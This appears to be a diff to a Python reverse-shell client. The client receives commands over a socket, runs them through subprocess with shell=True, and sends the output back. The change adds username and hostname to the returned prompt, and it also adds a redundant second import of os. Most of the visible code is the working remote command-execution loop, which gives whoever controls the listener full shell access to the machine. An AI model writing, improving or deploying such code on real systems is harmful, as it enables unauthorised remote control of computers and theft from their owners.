@@ -1,7 +1,9 @@
 import os
 import socket
 import subprocess
-
+import getpass
+import platform
+import os
 
 # Create a socket
 def socket_create():
@@ -38,7 +40,7 @@ def receive_commands():
             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             output_str = str(output_bytes, "utf-8")
-            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+            s.send(str.encode(output_str + str(getpass.getuser() +'@'+ platform.node()+':'+os.getcwd()) + '> '))
             print(output_str)
     s.close()
 
